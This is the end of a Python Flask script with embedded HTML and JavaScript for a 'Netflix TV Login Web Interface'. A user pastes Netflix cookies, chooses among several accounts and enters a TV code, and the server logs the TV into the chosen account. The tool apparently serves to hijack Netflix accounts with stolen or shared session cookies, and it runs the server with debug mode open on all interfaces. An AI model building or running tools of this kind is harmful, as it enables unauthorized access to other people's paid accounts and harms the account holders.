            const tvCode = document.getElementById('tvCode').value.trim();
            
            if (!tvCode || !/^\d{8}$/.test(tvCode)) {
                showAlert('error', 'Please enter a valid 8-digit TV code');
                return;
            }

            setLoading('loginBtn', true);
            showAlert('info', 'Logging into TV...', 0);

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        session_id: sessionId,
                        netflix_id: selectedAccount.full_id || selectedAccount.netflix_id,
                        tv_code: tvCode
                    })
                });

                const data = await response.json();

                if (data.success) {
                    currentStep = 4;
                    updateProgress();
                    showAlert('success', '✅ Login successful! Your TV should now be connected.');
                } else {
                    showAlert('error', data.message || 'Login failed. Please try again.');
                }
            } catch (error) {
                showAlert('error', 'Network error. Please try again.');
            } finally {
                setLoading('loginBtn', false);
            }
        }

        // Clear all
        async function clearAll() {
            document.getElementById('cookieInput').value = '';
            document.getElementById('tvCode').value = '';
            selectedAccount = null;
            sessionId = null;
            allAccounts = [];
            currentStep = 1;
            updateProgress();
            showAlert('success', 'Cleared all data');
            
            // Clear session on server
            try {
                await fetch('/clear-session', { method: 'POST' });
            } catch (error) {
                console.error('Failed to clear session:', error);
            }
        }

        // Start new login
        function startNew() {
            clearAll();
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            updateProgress();
            
            // Auto-focus cookie input
            document.getElementById('cookieInput').focus();
            
            // Handle paste events
            document.getElementById('cookieInput').addEventListener('paste', (e) => {
                setTimeout(extractCookies, 100);
            });
            
            // Handle enter key on TV code
            document.getElementById('tvCode').addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    performLogin();
                }
            });
        });
    </script>
</body>
</html>
    ''')

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════╗
    ║     Netflix TV Login Web Interface       ║
    ║         MadeBy: t.me/still_alivenow      ║
    ╚══════════════════════════════════════════╝
    """)
    
    # Create .env file if it doesn't exist
    if not os.path.exists('.env'):
        with open('.env', 'w') as f:
            f.write('SECRET_KEY=your-secret-key-change-in-production\n')
        print("📝 Created .env file - please change the SECRET_KEY for production")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
